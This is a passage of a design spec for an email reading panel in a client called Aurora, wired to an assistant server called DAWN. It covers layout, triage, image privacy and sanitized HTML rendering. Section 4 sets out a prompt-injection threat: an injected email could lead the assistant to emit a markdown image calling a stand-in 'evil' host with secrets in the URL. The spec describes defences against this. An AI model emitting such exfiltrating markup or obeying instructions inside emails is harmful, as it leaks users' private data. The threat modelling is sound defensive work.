# Email Panel: Design Spec

**Status:** draft v2, 2026-10-01. Designed UX-first in Aurora, then reviewed by four specialist
lenses (plan/state-of-the-art, UI, front-end security, render-seam architecture); their findings
are folded in. The DAWN half (section 9) goes to DAWN after the Aurora mock-up is agreed.
The Aurora P1 panel is built against a dev simulator (section 13); the DAWN wire is not.

> **Wire status (2026-10-07):** DAWN P1.1 (branch `email-panel`, `f3a6a597`) is wired in
> `src/ingest/email-wire.ts`: list / search / read / set_flags / unread_counts / list_accounts, each
> request tagged with a page-unique `req` (matched out of order; SUPERSEDED ignored; one retry on a
> timeout). DAWN's WEBSOCKET_PROTOCOL.md "Email" section is the source of truth for shapes. P1.2
> (`bbf2824f`) is wired too: archive / trash (batched, never re-sent) / undo, and the `email_changed`
> notice. Live changes (P1.3) aren't on the wire yet: no new-mail bells; the list refreshes by hand.

## 1. Goal

A calm, movable, resizable mail panel in Aurora: scan every inbox in one list, read a message,
triage it (read/unread, archive, trash), and hand a message to the assistant to talk about.
Later phases add reply / forward / compose, attachments, and threads. Every phase is a piece of
the final client: no stop-gaps, and the P1 shapes are the ones P3 builds on.

**Why it needs DAWN work:** today DAWN exposes email to a browser only as account configuration
(`email_list_accounts` and friends). Every mailbox operation lives inside the LLM tool and
returns model-formatted text. There is no message cache, no polling, and no new-mail push. The
IMAP read path has no MIME parser (no multipart, transfer-decoding, or charset handling), so
there is no HTML part to hand out. Reply headers, CC, forward, mark read/unread, and attachment
listing do not exist even in the tool.

## 2. Phasing

| Phase | Scope |
|---|---|
| **P1: Read + triage** | Merged list across chosen accounts, infinite scroll, Unread filter, search, reader, open marks read, Mark unread, archive, trash (with undo), send to chat (new private chat / current chat), unread counts on the collapsed bar, live updates while visible, opt-in new-mail notifications, collapse + resize, HTML bodies as markdown (section 6), attachment LIST (names/sizes, no download). |
| **P2: Write** | Reply, Reply all, Forward, Compose (To/CC/BCC, multiple recipients, threading headers, a real body cap), server-held send with undo, Server-side drafts optional. |
| **P3: Depth** | Attachment download + **"Add to Library"** (save a supported attachment into the user's DAWN document library so the assistant can use it) + inline `cid:` images, thread view, folders/labels picker, star/flag. ("View original" moved forward: 6.4.) |
| **Future (parked)** | AI one-line summaries per row (section 11), full keyboard shortcuts, per-sender "always show images", archive-vs-delete preference, user-chosen account colors/letters, a reloaded email chip that opens the message in the Mail panel. |

## 3. Panel UX

### 3.1 Placement and states

- A self-owned movable view (`makeMovable`, the shared snap set + reactor dead zone), toggled
  from the Panels menu. **Default off** (opt-in, like Stocks: mail is private and should not
  auto-appear on a screen someone else can see). The first time it is enabled it opens
  **expanded**, so its use is obvious; after that it restores whatever state the user left it in
  (collapse persisted).
- **Collapsed bar:** caret, "MAIL" (uppercase label style, like the picker's toggle), the unread
  count across the selected accounts (`--text` when above 0, `--text-faint` at 0, "99+" cap), then
  a 12 px account tile (3.3) for each account with unread mail. No pulse or glow; an increase lifts
  the count to `--accent` for 300 ms and fades back (none under reduced motion). Accessible name
  "Mail, 12 unread" + `aria-expanded`; each tile titled "Work: 5 unread". Expands downward, or
  upward when docked low (like the picker's `cpick-up`). A broken account (auth revoked) shows its
  tile with a neutral "!" mark, never `--alert`.
- **Expanded:** resizable from every edge and corner (3.6). Minimum 300 x 360 px, default
  340 x 520 px (narrow, so a first open never covers the reactor). Size persisted.
- **Narrow (panel width below 720 px):** list OR reader. Opening a message replaces the list;
  Back returns to the list at the same scroll position.
- **Wide:** list left, reader right. Switch to split at >= 720 px, back to single below 680 px
  (hysteresis, so the layout doesn't flap while dragging a grip). List column
  `clamp(280px, 38%, 380px)`, a 1 px divider at `--accent` 18%. Decided from the panel's OWN width
  (ResizeObserver), not the viewport. The selection carries across a layout switch both ways.
- **Surface:** the denser picker surface, not the Stocks one: `--ground-raise` at ~72% +
  `backdrop-filter: blur(12px)`, because rows of small text over the reactor's bloom need the
  contrast. Body text never uses `--text-faint`.

### 3.2 Header (expanded)

- **Account filter:** a popover with real checkboxes in a fieldset: "All accounts" plus one row per
  enabled account (tile, address, unread count). Escape closes it and focus returns to the trigger.
  Unchecking every account is allowed (owner's call): the list then reads "No accounts
  selected · Show all" and requests nothing. Persisted.
- **Unread only:** a pill toggle (like the Stocks EXT pill: dim off, accent on).
- **Search** field over the selected accounts. Escape clears it and returns to the list.
- **Refresh** (also implicit on expand).

### 3.3 List row and account identity

```
 ▌[W]●  Sender Name                     2:14 PM
 ▌      Subject line, one line, ellipsized
 ▌      First line of the preview, muted...
```

- **Grid:** `4px account bar | 16px tile gutter | content`, padding 6 px 8 px, three lines (~60 px).
  - Line 1: sender (`--fs-data`), unread dot, date right-aligned (`--fs-label`, tabular-nums).
  - Line 2: subject (`--fs-data`).
  - Line 3: preview (`--fs-label`), the provider snippet (no AI in P1).
- **Account identity never rests on hue alone.** Each account has a **monogram tile**: 16x16 px,
  radius 3 px, 1 px border + letter in the account color, fill at ~12%. The letter is the first
  letter of the account's display name or domain; two accounts with the same first letter take a
  second letter. The tile appears in the row gutter, reader header, filter list, and collapsed
  bar. The 4 px full-height bar (account color at ~70%) groups a long scan; the tile identifies.
- **Account color tokens** (`--account-1`..`--account-8` in `tokens.ts`), all cool/neutral, kept
  clear of every token that already means something (`--alert` red-orange = needs you, `--warn`
  gold = energy, `--loss`, `--gain`, `--accent` = unread, `--cool`): periwinkle `#7FA2FF`, violet
  `#A88BFF`, orchid `#D58FE6`, steel `#8FB8D9`, lavender `#B9A6E0`, slate `#93A3C4`, stone
  `#C9C2A8`, sage `#A6C98A`. Verify >= 3:1 on the surface and run a CVD simulation at build time.
  Assigned by stable account order (DAWN account id ascending); past 8 the colors repeat and the
  letter disambiguates. Hue alone separates about 5 accounts; the letter carries the rest.
- **Unread, three cues:** a 6 px `--accent` dot, weight 600, sender/subject in `--text`, date in
  `--text-dim`. **Read:** weight 400, sender/subject `--text-dim`, preview/date `--text-faint`. No
  glow, no colored fill.
- **Date:** time today, weekday this week, else a short date, in the DAWN user's timezone (the
  Context panel's helper). It is the server RECEIVE time, not the spoofable `Date:` header (9.2).
- Starred / important (Gmail): outline glyphs in `--text-faint`, never a gold star.
- **Row actions** (Archive, Mark read/unread, Trash) show on hover AND `:focus-within`, hidden at
  rest so the list is just text. Hit targets >= 24x24 px. **Reflow lockout:** row buttons ignore
  clicks for ~400 ms after any list reflow (or until the pointer moves), so a fast double-click
  can't archive the row that slid under the cursor.
- **Infinite scroll:** an IntersectionObserver sentinel requests the next page (25 rows). Loaded
  rows cap at 1000 with a "Refine with search to see older mail" footer (distinct from "End of
  inbox"), so a panel left open for days can't grow without bound.
- Row `aria-label`: "Unread, from Jane Doe, Work account, <subject>, 2:14 PM".

### 3.4 Reader

- **Previous / Next** (up/down chevrons after Back; `K` / `J` while a message is open and focus
  isn't in a field): step through the list order, disabled at the ends; Next at the end of the
  loaded rows loads the next page and opens its first message. Stepping opens (and so marks read)
  the message, like any deliberate open.
- **Toolbar:** `[Back] [Archive] [Mark unread]  [Trash]` as 28 px icon buttons (aria-label +
  title; Back only when narrow; Trash last, with extra space between it and Archive), a spacer, then
  the Discuss group on the right:
  - **Discuss privately** (primary: accent outline, lock glyph) starts a new private chat (section 4).
  - **Discuss here** (secondary, text-dim, no border) adds it to the current chat.
  - Below ~420 px of reader width both collapse into one **Discuss ▾** menu button.
  - P2 adds Reply / Reply all / Forward. Read-only accounts hide every write action; Discuss stays.
- **Header block:** subject; From (name + address); To / CC (collapsed to "to me, +3", expandable);
  full date; the receiving account (tile + address).
- **Show images bar** (only when real images were blocked): between header and body, image glyph +
  "3 remote images blocked (they can track opens) · Show images", `--text-dim` on `--accent` 6%.
  Information, not alarm. Dropped tracking pixels are never counted. Gone once shown.
- **Body:** the markdown render (section 6), in the same face the chat uses for prose (mono stays
  for headers/metadata). A truncated body says so at the cut point: "Shortened · showing the first
  N KB" (`--text-faint`).
- **Attachments (P1, list only):** chips with name, type, size; no download until P3.
- **Open marks read.** A live update never opens the reader by itself (opening has a data effect).
- **After Archive / Trash:**
  - Narrow: back to the list, focus on the row that took the removed row's place.
  - Wide: the reader shows a quiet "Select a message" placeholder; selection and focus move to the
    next row, but it is NOT opened (auto-advance would mark mail read the user never chose to open).
- **Mark unread:** narrow returns to the list with the row re-bolded; wide stays on the message and
  re-bolds the row. A list refresh never re-marks the selected message read; only a fresh open does.
- **Not found** (moved/deleted elsewhere): "This message was moved or deleted", and the row drops.

### 3.5 States

- **Loading:** static skeleton rows (`--text` at 6%, no shimmer), shown only after 250 ms so a fast
  load doesn't flash.
- **Empty:** "No mail" / "No unread mail" / "No results for 'x' in 2 accounts · Clear".
- **Partial failure:** a slim neutral banner per failed account (`--text-dim`, its tile, Retry,
  dismiss), never `--alert`. Copy by error code (9.1): `AUTH_REVOKED` -> "Work needs reconnecting
  in DAWN's settings"; `UNREACHABLE`/`TIMEOUT` -> "Couldn't reach Work"; others -> the generic line.
- **Load-more failure:** inline "Couldn't load more · Retry" at the sentinel.
- **Stale cursor:** reload quietly from the top.
- **Offline:** list kept, dimmed, actions disabled (like the composer).
- **No accounts:** "Add an email account in DAWN's settings" (account setup is DAWN WebUI territory).
- **Feature unknown / unavailable:** "Loading" until DAWN's config frame arrives, then "Mail isn't
  available on this DAWN" if the `email_client` flag is absent (8.4).

### 3.6 Shared resize helper

- `makeResizable` in `src/render/resizable.ts`, a sibling of `movable.ts`: 6 px edge and 12 px
  corner hit zones, cursor feedback only (a corner tick on hover), min/max size.
- **It needs a handle on makeMovable.** makeMovable keeps its per-axis anchor (lo / hi / center /
  free) in a closure and returns only `dispose`. Add `makeMovableHandle(el, opts)` returning
  `{ dispose, anchors(), commitResize(edges) }`; `makeMovable` becomes a thin wrapper returning
  `handle.dispose`, so existing callers are untouched. `makeResizable(el, { movable: handle, ... })`
  sets the px size, moves left/top during left/top-edge drags (movable's ResizeObserver re-dock is
  gated off while `:active`), and calls `commitResize` on release. The anchor rules stay in
  movable.ts: a right-docked panel grown from its left edge stays right-docked; grown from its right
  edge it becomes free; a centered axis resized becomes free.
- Snap anchors use each panel's measured width, not the 300 px `--movable-width` assumption.
- Max width is clamped so a side-docked edge can't intrude into the reactor dead zone.
- Size is per-machine layout (like every panel's position), its own key, px, clamped to the
  viewport on restore and on window resize, applied BEFORE movable places the element.
- Keyboard resize is a known gap (noted, not in P1).
- **Built shared, adopted only by Mail for now.** Whether Library, Context, or the conversation
  window adopt it is a separate scope discussion.
- **Click-to-front (shared):** a press anywhere on a movable panel, or on the conversation
  window (`registerRaisable`), brings it in front of the others (`raiseMovable` in movable.ts; a
  band of z-index 5..20 seeded by mount order). The menubar, docks, and notification cards sit
  above the band; the HUD clock/telemetry opt out (they live in #hud's own stacking context);
  a view opening itself (Mail from a card) also raises.

### 3.7 Keyboard and accessibility baseline

(Basic access, not the parked shortcut set.)
- The list is one tab stop with a roving tabindex: Up/Down move, Enter opens, Home/End jump.
- Narrow: opening moves focus to the reader subject (`tabindex=-1`); Back / Escape restore focus to
  the originating row and its scroll position.
- Wide: Enter opens in the reader and focus stays in the list; Tab / F6 moves into the reader.
- Escape order: close a popover, then clear search, then go back (narrow).
- Live regions (`aria-live=polite`): new-mail count changes and the undo toast.
- `:focus-visible` outline `2px solid var(--accent)`, offset 2 px (the existing pattern).

### 3.8 Calm rules

Glow only on the panel title. Color is spent on account tiles/bars and the unread dot, nothing
else. Row actions hidden at rest. Arrivals use a fading wash, never motion or a pulse. Reduced
motion removes every animation listed here.

### 3.9 Mail options (v2 2026-10-08: UI, security and architecture reviews folded)

**Container: a two-level popover**, renamed **"Mail options"** (the filter button's label and title
too; `role="dialog"`, non-modal). It gains `max-height: min(70vh, calc(100% - 2.6rem));
overflow-y: auto; overscroll-behavior: contain`, so a short panel can't cut it off.

- **Level 1** (what's touched often):
  - **Show mail from (this screen)**: All + a checkbox per account, each with its bell (unchanged).
  - **Notifications** (only while a bell is on): "Show the sender only" and **"Chime for new mail"**,
    with a faint footnote "Notifications apply to this screen only."
  - A last row, **"Reading options ›"**, swaps the content in place to level 2 (focus moves to the
    back row; Escape goes level 2 -> level 1 -> closed, focus back on the filter button; a 120 ms
    crossfade, instant under reduced motion).
- **Level 2** ("‹ Back to Mail options" at the top), fieldsets with legends in the existing legend
  style, radio groups (`name=` per group, styled via `accent-color`) and checkboxes only (no
  `<select>`, no new toggle component):
  - **Images**: "Always show images" (off) with its description line in `--text-dim` (tied by
    `aria-describedby`): "Anyone who emails you, spammers included, can see when and roughly where
    you open it." Turning it ON is a deliberate step: the line shows first with "Turn on" / "Cancel"
    before it commits. Then **Trusted senders**: always shown ("none yet · trust a sender from the
    images bar in a message" at 0), a list in its own scroll region (`max-height: 10rem`), sorted by
    domain then local part, a filter field once there are more than 8, each row the exact address
    (middle-ellipsized, full value in `title`) with an x ("Stop trusting {addr}"). Removing shows an
    inline "Removed · Undo" for ~5 s and moves focus to the next remove button (or the previous, or the
    heading). While Always show images is on, the list stays editable but reads "Not needed while
    Always show images is on".
  - **Reading**: **Mark as read**: Immediately / After 3 seconds / Only when I choose.
    **After archive or trash**: Go back to the list (default) / Open the next message (older) /
    Open the previous message (newer). **"Preview line under each message"** (on; off also tightens
    the row height token, so the list really gets denser).

**Mark as read, precisely.**
- "Shown" = the body is loaded (not the loading state) AND the reader is visible: the panel expanded,
  the tab visible, standby not up. The 3 s timer pauses (not resets) while any of those is false.
- Cancelled by J/K, Back, opening another row, Archive / Trash / Mark unread on that message,
  collapsing, or a live update removing it: the message stays unread and nothing is sent.
- Split view: opening in the reader starts it; moving the list selection without opening doesn't.
- No flash and no countdown: the row's unread dot and weight stay until the timer fires, then settle
  with the arrival wash (instant under reduced motion). One mark per open; a list refresh never marks.
- **The reader's mark button becomes a read/unread toggle in every mode** ("Mark read" / "Mark
  unread", icon and label swap), so "Only when I choose" has a control in the reader, including the
  narrow view (where only Mark unread returns to the list, as 3.4 says). Keyboard shortcuts for it stay
  parked with the full shortcut set (2).

**After archive or trash.** The default, "Go back to the list", is today's behaviour exactly (split:
the next row is selected, not opened; narrow: the list). "Open the next / previous message" opens it,
so it is marked read per the Mark as read setting (Gmail's behaviour; two explicit choices). At the
end of the list it falls back to the list; it never wraps.

**Per-sender images, in the reader.** The images bar: "N images blocked · **Show images** ·
**Always show from {addr}**" (the explanation that images can track opens moves to the bar's `title`;
both actions `--text-dim`; Show images first, the one-off safe action). For a trusted sender:
"Images from {addr} load automatically · **Stop**". Stop reverts at once (images unload, the bar
returns to blocked, a polite live line "Stopped trusting {addr}"); Always again re-trusts; no confirm.
The exact address is always shown (bound via `textContent`), so "PayPal <x@paypa1.example>" reads as
what it is; an IDN domain is shown as punycode.
- **Key:** the reader's message `from_addr`, normalized: NFC, domain as a lowercase IDN A-label, local
  part lowercased; never strip `+tags` or dots (that would trust other mailboxes); well-formed only
  (one `@`, <= 254 bytes). Reply-To is never used for trust.
- **Spoofing.** A forged From gets a trusted sender's images loaded: a privacy cost (an open signal),
  never safety (images are inert). The guard is DAWN's authentication result (9.14 item 5): trust and
  the global switch auto-show only on `pass`; `fail` never auto-shows; a missing result (an older DAWN)
  falls back to address alone, said in the Trusted senders list ("trusted by address").
- **One gate.** Trust and the global switch only set the same per-message "shown" flag the single
  sanitize choke point reads (6.2). No separate path; the held Layout view (6.4) honours it the same
  way, and a per-sender Layout preference never implies it.

**Undo grouping (no setting).** Moves of the same kind on the same account while the Undo toast shows
merge into it ("Archived 3 · Undo" takes back all three); another kind or account starts a new toast.

**No "Show archived" setting.** The inbox excludes archived mail by definition and search already
covers all mail (Gmail; IMAP with an All Mail folder); an Archive view belongs with the P3 folder picker.

**Where each setting lives.** What follows the PERSON goes to DAWN (9.14) and syncs; what's about
THIS SCREEN stays in the browser. Only the two per-screen groups say so ("this screen"); no sync badges.

| Setting | Lives | Key |
|---|---|---|
| Trusted senders | DAWN | `mail.trusted_senders` |
| Always show images | DAWN | `mail.always_images` |
| Mark as read | DAWN | `mail.mark_read` |
| After archive or trash | DAWN | `mail.after_move` |
| Preview line | DAWN | `mail.previews` |
| Show the sender only | DAWN | `mail.sender_only` |
| Account filter, bells, Chime | browser | `dawn.hero.mailPrefs` (as today) |
| Unread only, position / size / open / visible | browser | existing keys |

**Fail-safe until loaded.** Until this connection's settings have loaded, the privacy-sensitive ones
take the stricter of the cached value and the default: no automatic images (trusted or global) and
sender-only notices. Everything else renders from the cache straight away (no held render).

How these are stored, cached, synced and validated: 8.7.

## 4. Send to chat

**The rule:** email is attacker-authored text, and the assistant has tools (including sending
email). Aurora never pastes a message body into the chat; it sends a REFERENCE, and DAWN fetches,
wraps, and stores the content itself.

**Flow:**
1. **Discuss here:** Aurora adds an email chip to the composer (sender + subject, removable). The
   user types a question and sends.
2. **Discuss privately:** the ingest starts the conversation EAGERLY (`new_conversation`, which
   returns its id at once), sends `set_private`, and **waits for a successful
   `set_private_response`** before the chip is armed and the composer focused. On failure: a notice,
   and no chip. (Aurora normally creates chats lazily, with a privacy toggle replayed once the id
   arrives, which would persist the first row, the one carrying the email, as public. The ingest
   owns this ordering behind `newConversation({ private: true })`; no wire change.)
3. On Send, the `text` turn carries `email_refs: [{account_id, message_id}]` (P1: max 1). Refs come
   only from a chip the user added from a message they opened; never from frame content, a body,
   or a reloaded marker. Only the user's Send sends them.
4. DAWN fetches (ownership-checked), and stores the email as a **kinded context row placed before
   the user's question** (DAWN's existing kinded-row mechanism: restored into the LLM history on
   reload, skipped by memory extraction, hidden from the client's transcript), wrapped as untrusted
   content (9.8). The user row keeps a display marker so the chip re-renders on reload without a
   mailbox round-trip.
5. **Memory extraction never sees the email block**, in private and public conversations. Facts can
   still be learned from what the USER says.
6. **The marker is parsed only from user-role rows**, so a forged marker in an assistant reply
   can't render a chip.
7. **Off-origin images in assistant replies are not auto-loaded** (a P1 requirement on the chat
   renderer, not only the mail panel). An injected email can tell the model to emit
   `![x](https://evil/?d=<secrets>)`, and the chat renders markdown on every stream delta, so the
   image would fire mid-stream and exfiltrate. Off-origin images in replies render as a click-to-load
   placeholder showing the host. This applies to every conversation, since an injection can arrive
   through any tool, not only this chip.
   **Built (2026-10-09):** `src/conversation/format.ts` (now `src/render/markdown.ts`) renders markdown through its own DOMPurify
   instance that removes everything that fetches by itself (srcset, picture/video/audio/source/
   track, input, form/button, inline style, table background, svg/math, href except on links, src
   except on images); an off-origin `<img>` becomes a placeholder naming its host, loaded only by a
   click (nonce-checked, so a reply can't forge one). Model-drawn visuals (`<dawn-visual>`, sandboxed
   srcdoc frames) carry a meta CSP with no network access (`default-src 'none'`), the page's
   `frame-src 'self'` stops a visual navigating its own frame elsewhere (a second load also closes
   the frame), and WebRTC constructors are removed before the model's code runs. A nested frame
   would bring a fresh WebRTC (CSP doesn't stop an about:blank / srcdoc child), so no frame may
   exist in a visual: frame tags in the model's markup are neutralized before parsing, and the
   prelude refuses every runtime route to one (createElement, node insertion incl. fragments and
   Range, the HTML-parsing setters, document.write, execCommand), with non-configurable
   replacements the model's code can't restore. **Residual:** a browser API that builds a frame by
   a route not listed here; the fully closed alternative is not running model scripts at all.
8. **The assistant's own send/trash confirm is conversational by design (see 9.0):** the model
   asks and the user answers in the conversation (voice-first). That is the owner's intended model;
   the wrapper (9.8) and the reply-image block (7 above) are what limit an injected email.

## 5. Triage semantics

- **Open = mark read.** Same on both backends (9.4).
- **Archive:** one click, the provider's archive (Gmail: remove INBOX; IMAP: move to the account's
  resolved Archive folder).
- **Trash:** one click with an undo toast. No confirm, BECAUSE recovery is guaranteed server-side:
  DAWN never expunges for a trash, and where an account has no Trash folder it refuses with
  `NO_TRASH` up front (Aurora then shows the action disabled with that reason). CLAUDE.md's confirm
  rule is for permanent destruction, which Aurora never does. **No permanent delete in Aurora.**
- **Optimistic, server-committed, server-undone.** The row hides at once and the verb is sent on
  the click; a server failure restores the row with a toast. The response carries an `undo` token
  per message; Undo sends `email_undo`. (A client-side deferred commit was rejected: a reload, a
  closed tab, or a dropped socket inside the window would silently skip an action the user saw
  happen.)
- **Undo toast:** inside the panel, bottom-center, 8 px up (not a `src/notify/` card; those drift
  and recede, and the user's eyes are on the panel). "Moved to Trash · Undo" / "Archived · Undo".
  6 s with a 1 px `--accent` hairline countdown (static under reduced motion), paused on hover or
  focus. One toast at a time: a new action replaces it and the older undo leaves the UI. Undo is a
  real button. A failed undo says "Couldn't undo: <reason>". A restored row returns to its sort
  position with the arrival wash. If the panel collapses during the window the toast sits under the
  bar.
- **Batch actions** are not in P1, but every write verb takes `message_ids[]`.

## 6. Rendering bodies: HTML to markdown

Most mail is HTML. P1 converts it to markdown for a calm, readable reader (the owner's UX call; a
directly sanitized-HTML render was considered and keeps more layout, which P3's "View original"
covers instead).

### 6.1 Pipeline

1. DAWN returns `body_html`: the DECODED, UTF-8 HTML part (9.3), size-capped, with `html_truncated`.
2. Aurora parses it with `DOMParser` into an inert document. **No node from that document is ever
   moved into the page** (`importNode` / `adoptNode` / `appendChild` / an `innerHTML` read-back
   would make images fetch and handlers run, and `<noscript>` parses differently there). The walker
   produces a STRING only.
3. The walker (`src/email/html-to-md.ts`, purpose-built, no new dependency):
   - Drops whole subtrees: `script style head noscript template svg math iframe frame object embed
     applet link meta base form input button select textarea picture source video audio`.
   - Drops tracking pixels: 0/1 px width or height, `hidden`, inline `display:none` /
     `visibility:hidden` / `width:0`. Best-effort; the real guarantee is 6.2.
   - Emits markdown for headings, paragraphs, line breaks, emphasis, links, lists, blockquotes,
     pre/code, hr, images, and tables flattened to rows.
   - **Escapes every text node**: HTML-escapes `< > &` and backslash-escapes the markdown
     metacharacters, so attacker text can never become markdown or HTML syntax.
   - **URLs via `getAttribute()` only** (never the resolved `.href`/`.src` properties), `<base>`
     ignored. Accepted: absolute `https:`/`http:` (plus `mailto:` for links). Dropped: relative,
     protocol-relative, same-origin, `javascript:`, `data:`, `cid:` (until P3), everything else. An
     email-derived URL can never be same-origin, so it can never pick up Aurora's login.
   - Link mismatch: computed here from `new URL(href).hostname` (punycode, so lookalikes show) and
     emitted as escaped text.
   - Iterative or depth-capped, so pathological nesting can't blow the stack.
4. Rendering uses an **email-only** pipeline, never the chat's shared one:
   - its own `new Marked()` instance whose HTML renderer escapes raw HTML tokens (no `marked.use`
     on the global instance, which would change chat rendering);
   - its own `DOMPurify(window)` instance with `ALLOWED_TAGS` = p, br, h1-h6, strong, em, del, a,
     ul, ol, li, blockquote, pre, code, hr, table, thead, tbody, tr, th, td, img;
     `ALLOWED_ATTR` = href, src, alt, title; `FORBID_ATTR` = style, srcset, background, poster;
   - **without** the chat's same-origin `?app=` tagging hook;
   - an `afterSanitizeAttributes` hook that is the single image choke point (6.2) and forces
     `target=_blank rel="noopener noreferrer"` on every link.
5. Plain-text mail is built with `textContent` / `createElement` (linkifying absolute http(s) URLs),
   never fed raw into `marked`.

### 6.2 Images

- **Remote images are blocked by default** (they are tracking beacons: they signal the open and leak
  your IP). The sanitize hook drops `img[src]` unless that message's "shown" flag is set AND the URL
  is `https:`; a blocked image becomes an alt-text placeholder (dashed 1 px `--text` 20% box,
  aspect from width/height capped at 120 px tall; no dimensions -> an inline chip).
- Shown images get `referrerpolicy="no-referrer"` (set in the hook; DOMPurify would strip it).
- Images keep the sender's intended width/height (carried through markdown as a `#aurora-size=WxH`
  URL fragment the hook reads back), and in a reader narrower than the email's design width every
  image scales by the same factor (`src/email/fit-images.ts`), so they stay in proportion.
- Tracking pixels stay dropped after "Show images".
- Inline `cid:` images come in P3, mapped (before sanitize) only from `attachments[].content_id`
  values DAWN returned for that message, to the owner-checked part route (9.10).
- Fetching shown images through DAWN (and optionally an outside proxy) is specified in 9.13.

### 6.3 Links

New tab, `rel="noopener noreferrer"`. The real host is always available on hover/focus; when the
visible text is a URL whose host differs from the target, the real host is appended in
`--text-faint` mono, e.g. "(-> evil.example)". Neutral styling: marketing redirects mismatch
constantly, and an alarm color would cry wolf.

### 6.4 View original: the real layout, zoomed to fit (spec v2 2026-10-07, reviewed; HELD until DAWN fetches images, 9.13)

**Why.** The reader turns mail into markdown: calm and safe, but a newsletter's layout (columns,
buttons, image grids) is gone. Images already keep the sender's sizes, stay in proportion, and icon
rows stay side by side (6.2), so most mail reads well. "View original" is for the mail whose layout
carries the meaning, shown the way a phone mail app shows it: the sender's layout, scaled down.

**UX.**
- **The control:** one toggle button, **"Layout"** (columns glyph, `aria-pressed`, title "Show the
  sender's layout" / "Back to reading view"), in a slim **view row** between the header and the body,
  which also holds the Show images bar. Not in the reader bar (it is full, and this is a view mode, not
  an action on the message). Not "Original": in Gmail "Show original" means the raw source. Shown only
  for HTML mail. Focus stays on the toggle after switching.
- **Per message,** reverting when the message changes (J/K included) in v1; whether Layout should stick
  through one J/K session is decided before build. A per-sender preference comes with the parked
  per-sender options; it would be a per-user key in `USER_KEYS` and never imply Show images.
- **One scroller.** In Layout, `.mail-reader-scroll` stops scrolling and becomes a flex column: a
  compact header (subject on one line, From, date) and the view row are fixed; the paper fills the
  rest (`flex:1; min-height:0`) and the frame is the ONLY scroller (both axes). Attachments and the
  "shortened" note sit in a fixed strip under the paper so they stay reachable. The injected stylesheet
  sets `html{overscroll-behavior:contain}` so the email's scroll doesn't chain into the panel.
- **No white flash, dimmed paper.** The frame starts at `opacity:0` over a `--ground-raise` skeleton
  and is revealed on its `load` event or after 600 ms, whichever comes first (a 120 ms fade, none under
  reduced motion). The whole frame is dimmed with `filter: brightness(var(--paper-brightness))`
  (0.88; never below ~0.85, it would sink low-contrast mail). Never auto-invert.
- **Framed as the sender's content:** inset 6 px in the reader on a `--ground-raise` gutter, a 1 px
  `--paper-edge` border, 2 px radius, no glow. The view row reads "SENDER'S LAYOUT · 72%" (mono,
  label size, faint): the current scale is always shown.
- **Minimum zoom 0.6** (about a phone's 375/600): below that the frame's layout width becomes
  `readerWidth / 0.6`, the email scrolls sideways inside the same frame, and the view row adds
  "widen the panel to fit". (A "Fit" action that widens the panel can come later.)
- **Light, predictably:** `color-scheme: light` on the frame and `:root{color-scheme:light}` in the
  injected CSS, so the same email looks the same everywhere (sender dark modes are often half-built;
  honouring them can be a later per-sender option). Verify engines propagate it to the frame's
  `prefers-color-scheme`.
- **Keyboard contract** (no bridge, by design): J/K/Esc work while focus is in Aurora's chrome; inside
  the frame, Space / PgDn / arrows scroll the email and Tab / Shift+Tab leave it. Focus order: reader
  bar, view row (toggle, Show images), header, frame, the strip under it. Prev/Next clicks always work.
- **Drag and raise:** while any `makeMovable` / `makeResizable` drag is active, the frame gets
  `pointer-events:none` (a body class set by those helpers), so a drag crossing the paper isn't lost.
  A press inside the frame raises the panel: on window `blur` with `document.activeElement === frame`,
  call `raiseMovable(panel)`.
- **Links:** the browser's own title tooltip and status-bar URL work inside the frame (the reliable
  host disclosure there); no "(-> host)" mismatch text is injected (sender CSS could hide it, and it
  breaks button layouts). An injected `a:focus-visible` outline (3 px `--paper-focus`, `!important`)
  survives senders' `outline:none` and the scale.
- **Show images** is shared with Reading. In Layout it rebuilds the frame (the policy changes), so the
  email returns to the top: known behaviour.
- **Accessibility:** frame `title="Email from {sender}, sender's layout"`. Layout tables are noisy for
  screen readers and the layout can't reflow (WCAG 1.4.10): Reading is the conforming alternative,
  one more reason it stays the default. No transitions on scale or reveal under reduced motion.
- **Tokens** (tokens.ts, mirrored): `paper` (#F2F4F3, the pre-load and fallback canvas), `paperEdge`
  (accent 22% mix), `paperFocus` (#0A6A73, ~6:1 on white where the cyan accent fails), feel
  `paperBrightness` 0.88.

**Rendering (the security design).**
1. **Sanitize to an explicit allowlist, never DOMPurify's defaults** (they keep `background`,
   `poster`, `download`, `usemap`, `video`, `picture`, `source`, `noscript`, which fetch or misbehave).
   A SEPARATE DOMPurify instance, `WHOLE_DOCUMENT` + `RETURN_DOM`, on an inert DOMParser document.
   - Tags: html, head, body, title, style, table, thead, tbody, tfoot, tr, td, th, caption, colgroup,
     col, div, span, p, center, font, h1-h6, ul, ol, li, a, img, br, hr, b, i, u, s, strong, em,
     small, sub, sup, blockquote, pre, code.
   - Attributes: align, valign, width, height, bgcolor, color, border, cellpadding, cellspacing,
     colspan, rowspan, style, class, id, dir, lang, alt, title, href (a only), src (img only). On
     html/body only lang, dir, bgcolor.
   - `FORBID_ATTR` (belt and braces): background, srcset, imagesrcset, poster, ping, download,
     attributionsrc, crossorigin, loading, longdesc, lowsrc, dynsrc, usemap, action, formaction,
     xlink:href, data, cite, plus every event attribute.
   - The frame's hook: links pass `safeUrl` and get `target=_blank rel="noopener noreferrer"` and the
     hostname title; an image keeps `src` only under the image rule below; EVERY other URL-bearing
     attribute is removed generically (not just href/src); tracking pixels are dropped with the
     walker's own pixel test (shared code, not a copy); every kept image gets `loading="eager"` (a
     sender's lazy loading on a hidden image is a scroll-depth beacon).
   - DOMPurify's `SAFE_FOR_XML` drops a `<style>` whose text contains `<!--` (the common
     `<style><!-- ... --></style>` and MSO conditionals). That fails safe but can lose a layout:
     verify against real newsletters and, if needed, strip those comment markers before sanitizing.
2. **Build the document ourselves, never string-splice.** A fresh document: OUR `<head>` built with
   `createElement` / `setAttribute`, in this order: the CSP meta, `<meta name="referrer"
   content="no-referrer">`, `<meta http-equiv="x-dns-prefetch-control" content="off">`,
   `<base target="_blank">` (a missed link opens a tab instead of navigating the frame, which would
   drop our meta CSP), the injected stylesheet (color-scheme, overscroll, focus ring); then the
   sanitized `<style>` nodes and the sanitized body. Every sender `<meta>`, `<base>`, `<html>` /
   `<head>` attribute is discarded. Serialize as `'<!doctype html>' + documentElement.outerHTML`.
   (The iframe's `referrerpolicy` attribute does NOT cover a srcdoc's subresources, which take the
   parent's policy: the referrer meta is what keeps Aurora's origin from senders.)
3. **CSP:** `default-src 'none'; style-src 'unsafe-inline'; img-src data:` plus, in 2b only, DAWN's
